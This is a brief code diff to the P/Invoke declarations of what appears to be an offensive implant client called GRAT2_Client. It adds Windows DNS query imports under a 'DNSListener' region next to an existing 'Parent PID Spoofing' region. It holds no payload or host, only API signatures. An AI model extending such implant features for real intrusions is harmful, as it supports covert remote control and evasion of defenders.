@@ -66,7 +66,16 @@ namespace GRAT2_Client.PInvoke
         [DllImport("Kernel32.dll", SetLastError = true)]
         public static extern bool CloseHandle(IntPtr hObject);
 
-        
+        #region DNSListener
+
+        [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]
+        public static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)]ref string pszName, flags.DnsRecordTypes wType, flags.DnsQueryOptions options, IntPtr pExtra, ref IntPtr ppQueryResults, int pReserved);
+
+        [DllImport("dnsapi", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
+
+        #endregion DNSListener
+
         #region Parent PID Spoofing
         [DllImport("kernel32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
